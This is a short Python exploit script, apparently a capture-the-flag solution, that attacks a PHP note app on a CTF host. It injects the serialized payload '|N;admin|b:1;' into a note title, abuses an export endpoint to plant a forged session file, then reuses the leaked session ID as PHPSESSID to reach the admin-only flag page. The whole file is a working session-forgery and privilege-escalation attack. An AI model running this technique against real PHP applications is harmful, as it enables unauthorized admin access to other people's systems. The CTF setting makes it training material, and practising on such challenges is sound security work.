import re
import sys
import requests

URL = 'http://af8cfb6f3732bbedb4c8df90.http-ctf2.dasctf.com:80/'
flag_re = re.compile(r'(?:flag|FLAG|ctf|CTF|HarekazeCTF)\{[^}]+\}')

for attempt in range(1, 31):
    s = requests.Session()
    r = s.post(URL + 'login.php', data={'user': 'sess_'}, timeout=10, allow_redirects=True)
    r = s.post(URL + 'add.php', data={'title': '|N;admin|b:1;', 'body': 'hello'}, timeout=10, allow_redirects=True)
    r = s.get(URL + 'export.php?type=.', timeout=10, allow_redirects=False)
    cd = r.headers.get('Content-Disposition', '')
    m = re.search(r'sess_([0-9A-Za-z,-]+)', cd)
    print(f'attempt={attempt} status={r.status_code} len={len(r.content)} cd={cd!r} sess_match={m.group(1) if m else None}')
    if not m:
        continue
    fake_id = m.group(1)
    r = requests.get(URL + '?page=flag', cookies={'PHPSESSID': fake_id}, timeout=10)
    txt = r.text
    mm = flag_re.search(txt)
    if mm:
        print('FLAG=' + mm.group(0))
        pathlib = None
        open('artifacts/fake_session/flag_response.html', 'w').write(txt)
        open('artifacts/fake_session/fake_session_id.txt', 'w').write(fake_id + '\n')
        sys.exit(0)
    print('no flag response snippet:', re.sub(r'\s+', ' ', txt)[:220])
print('failed')
sys.exit(1)
